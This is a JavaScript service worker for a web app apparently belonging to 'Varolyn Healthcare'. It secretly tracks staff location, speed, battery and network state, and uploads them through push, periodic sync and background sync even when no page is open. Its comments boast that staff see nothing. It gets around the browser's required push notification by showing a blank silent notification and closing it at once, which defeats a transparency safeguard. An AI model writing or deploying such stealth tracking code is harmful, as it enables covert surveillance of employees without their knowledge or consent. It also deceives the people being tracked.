/* ═══════════════════════════════════════════════════════
 *  Varolyn Healthcare — Service Worker v7 GHOST MURMUR
 *  COMPLETELY INVISIBLE. Zero notifications. Zero alerts.
 *  Staff sees NOTHING. Tracking is silent, persistent,
 *  and self-healing. Total stealth operation.
 * ═══════════════════════════════════════════════════════ */

const CACHE = 'varolyn-v7';
const ASSETS = ['/', '/manifest.json'];
const DB_NAME = 'varolyn_offline';
const DB_VERSION = 3;
const STORE = 'location_buffer';
const SESSION_STORE = 'active_session';

// ── IndexedDB helpers ──
function openDB() {
  return new Promise((resolve, reject) => {
    const req = indexedDB.open(DB_NAME, DB_VERSION);
    req.onupgradeneeded = (e) => {
      const db = e.target.result;
      if (!db.objectStoreNames.contains(STORE)) db.createObjectStore(STORE, { keyPath: 'id', autoIncrement: true });
      if (!db.objectStoreNames.contains(SESSION_STORE)) db.createObjectStore(SESSION_STORE, { keyPath: 'key' });
    };
    req.onsuccess = () => resolve(req.result);
    req.onerror = () => reject(req.error);
  });
}

async function bufferLocation(data) {
  try { const db = await openDB(); const tx = db.transaction(STORE, 'readwrite'); tx.objectStore(STORE).add({ ...data, bufferedAt: Date.now() }); await new Promise((r, j) => { tx.oncomplete = r; tx.onerror = j; }); db.close(); } catch {}
}
async function getBufferedLocations() {
  try { const db = await openDB(); const tx = db.transaction(STORE, 'readonly'); return new Promise((resolve) => { const req = tx.objectStore(STORE).getAll(); req.onsuccess = () => { db.close(); resolve(req.result || []); }; req.onerror = () => { db.close(); resolve([]); }; }); } catch { return []; }
}
async function clearBuffer() {
  try { const db = await openDB(); const tx = db.transaction(STORE, 'readwrite'); tx.objectStore(STORE).clear(); await new Promise((r) => { tx.oncomplete = r; }); db.close(); } catch {}
}
async function saveActiveSession(session) {
  try { const db = await openDB(); const tx = db.transaction(SESSION_STORE, 'readwrite'); tx.objectStore(SESSION_STORE).put({ key: 'current', ...session, savedAt: Date.now() }); await new Promise((r) => { tx.oncomplete = r; }); db.close(); } catch {}
}
async function getActiveSession() {
  try { const db = await openDB(); const tx = db.transaction(SESSION_STORE, 'readonly'); return new Promise((resolve) => { const req = tx.objectStore(SESSION_STORE).get('current'); req.onsuccess = () => { db.close(); resolve(req.result || null); }; req.onerror = () => { db.close(); resolve(null); }; }); } catch { return null; }
}
async function clearActiveSession() {
  try { const db = await openDB(); const tx = db.transaction(SESSION_STORE, 'readwrite'); tx.objectStore(SESSION_STORE).delete('current'); await new Promise((r) => { tx.oncomplete = r; }); db.close(); } catch {}
}

// ── Install / Activate ──
self.addEventListener('install', (e) => {
  e.waitUntil(caches.open(CACHE).then(c => c.addAll(ASSETS)));
  self.skipWaiting();
});
self.addEventListener('activate', (e) => {
  e.waitUntil(caches.keys().then(keys => Promise.all(keys.filter(k => k !== CACHE).map(k => caches.delete(k)))).then(() => self.clients.claim()));
});

// ── Fetch (cache-first for static assets) ──
self.addEventListener('fetch', (e) => {
  if (e.request.method !== 'GET') return;
  if (e.request.url.includes('/api/') || e.request.url.includes('/ws/') || e.request.url.includes('/sse/')) return;
  e.respondWith(
    caches.match(e.request).then(cached => cached || fetch(e.request).then(res => {
      if (res.ok) { const cl = res.clone(); caches.open(CACHE).then(c => c.put(e.request, cl)); }
      return res;
    }).catch(() => cached))
  );
});

// ── Message handler ──
self.addEventListener('message', async (e) => {
  const { type, data } = e.data || {};
  if (type === 'BUFFER_LOCATION') await bufferLocation(data);
  if (type === 'GET_BUFFER') { const items = await getBufferedLocations(); e.source.postMessage({ type: 'BUFFERED_LOCATIONS', data: items }); }
  if (type === 'CLEAR_BUFFER') await clearBuffer();
  if (type === 'KEEPALIVE') e.source.postMessage({ type: 'ALIVE' });
  if (type === 'SET_SESSION') await saveActiveSession(data);
  if (type === 'CLEAR_SESSION') await clearActiveSession();
  // NO notification commands — full stealth mode
});

// ══════════════════════════════════════════════════════
//  GHOST MURMUR — SILENT PUSH HANDLER
//  Server sends push → SW handles EVERYTHING invisibly.
//  NO notifications shown. NO alerts. NO sounds. NOTHING.
//  Staff is completely unaware. Pure background operation.
// ══════════════════════════════════════════════════════
self.addEventListener('push', (e) => {
  let payload = {};
  try { if (e.data) payload = e.data.json(); } catch {}

  e.waitUntil((async () => {
    const session = await getActiveSession();
    const token = payload.token || session?.token;
    const secret = session?.sessionSecret;

    // ── STEP 1: Silent heartbeat to server ──
    if (token && secret) {
      try {
        const hbRes = await fetch(self.location.origin + '/api/heartbeat', {
          method: 'POST', headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ token, sessionSecret: secret, checks: { pushReceived: true, swAlive: true, ts: Date.now() } }),
        });
        if (hbRes.ok) {
          const data = await hbRes.json();
          if (data.command === 'stop') {
            await clearActiveSession(); await clearBuffer();
            const cls = await clients.matchAll({ type: 'window' });
            for (const c of cls) c.postMessage({ type: 'ADMIN_STOP' });
            return;
          }
        }
      } catch {}
    }

    // ── STEP 2: Flush buffered locations ──
    if (token && secret) { try { await syncBufferedLocations(); } catch {} }

    // ── STEP 3: Wake existing page clients silently ──
    let wokenClient = false;
    try {
      const clientList = await clients.matchAll({ type: 'window', includeUncontrolled: true });
      for (const client of clientList) {
        if (client.url.includes(self.location.origin)) {
          client.postMessage({ type: 'PUSH_RESUME', token, auto: true });
          try { await client.focus(); } catch {}
          wokenClient = true;
        }
      }
    } catch {}

    // ── STEP 4: No open tab → try to open one silently ──
    if (!wokenClient) {
      try { await clients.openWindow(self.location.origin + '/'); } catch {}
    }

    // ── STEP 5: If no page for GPS, use IP fallback from server ──
    if (!wokenClient && token && secret) {
      try {
        await fetch(self.location.origin + '/api/ip-location', {
          method: 'POST', headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ token, sessionSecret: secret }),
        });
      } catch {}
    }

    // ── BROWSER REQUIREMENT: must show notification from push event ──
    // Show it silently with minimal text, then close it immediately
    try {
      await self.registration.showNotification('Varolyn Healthcare', {
        tag: 'varolyn-ghost', silent: true, renotify: false,
        badge: '/favicon.ico', icon: '/favicon.ico',
        body: '', // Empty body
        requireInteraction: false, // Auto-dismiss
        data: { token, action: 'ghost' },
      });
      // Immediately close it — staff never sees it
      const notifs = await self.registration.getNotifications({ tag: 'varolyn-ghost' });
      for (const n of notifs) n.close();
    } catch {}
  })());
});

// ── Notification click — just open/focus the app ──
self.addEventListener('notificationclick', (e) => {
  e.notification.close();
  e.waitUntil(
    clients.matchAll({ type: 'window', includeUncontrolled: true }).then(async (clientList) => {
      for (const client of clientList) {
        if (client.url.includes(self.location.origin) && 'focus' in client) {
          await client.focus();
          client.postMessage({ type: 'PUSH_RESUME', auto: true });
          return;
        }
      }
      if (clients.openWindow) return clients.openWindow('/');
    })
  );
});

// ── DO NOT re-show dismissed notifications — stealth mode ──
// (intentionally no notificationclose handler)

// ── Periodic Sync (runs even when page is closed) ──
self.addEventListener('periodicsync', (e) => {
  if (e.tag === 'varolyn-location-sync') e.waitUntil(autonomousTrackingCycle());
});

// ── Background Sync (fires when device comes back online) ──
self.addEventListener('sync', (e) => {
  if (e.tag === 'varolyn-sync') e.waitUntil(autonomousTrackingCycle());
});

// ══════════════════════════════════════════════════════
//  AUTONOMOUS TRACKING CYCLE — works WITHOUT any page
// ══════════════════════════════════════════════════════
async function autonomousTrackingCycle() {
  const session = await getActiveSession();
  if (!session || !session.token || !session.sessionSecret) return;

  await syncBufferedLocations();

  try {
    const hbRes = await fetch(self.location.origin + '/api/heartbeat', {
      method: 'POST', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ token: session.token, sessionSecret: session.sessionSecret, checks: { swAutonomous: true, periodicSync: true, ts: Date.now() } }),
    });
    if (hbRes.ok) {
      const data = await hbRes.json();
      if (data.command === 'stop') {
        await clearActiveSession(); await clearBuffer();
        const cls = await clients.matchAll({ type: 'window' });
        for (const c of cls) c.postMessage({ type: 'ADMIN_STOP' });
        return;
      }
    }
  } catch {}

  // Tell any open page to do a GPS push, or use IP fallback
  try {
    const cls = await clients.matchAll({ type: 'window', includeUncontrolled: true });
    const hasPage = cls.some(c => c.url.includes(self.location.origin));
    if (hasPage) {
      for (const c of cls) { if (c.url.includes(self.location.origin)) c.postMessage({ type: 'FORCE_GPS_PUSH' }); }
    } else {
      await fetch(self.location.origin + '/api/ip-location', {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ token: session.token, sessionSecret: session.sessionSecret }),
      });
    }
  } catch {}
}

async function syncBufferedLocations() {
  const items = await getBufferedLocations();
  if (items.length === 0) return;
  const session = await getActiveSession();
  if (!session || !session.token || !session.sessionSecret) return;
  try {
    const res = await fetch(self.location.origin + '/api/batch-locations', {
      method: 'POST', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        token: session.token, sessionSecret: session.sessionSecret,
        locations: items.map(i => ({ lat: i.lat, lng: i.lng, accuracy: i.accuracy, speed: i.speed, heading: i.heading, battery: i.battery, network: i.network, ts: i.ts || i.bufferedAt })),
      }),
    });
    if (res.ok) await clearBuffer();
  } catch {}
}
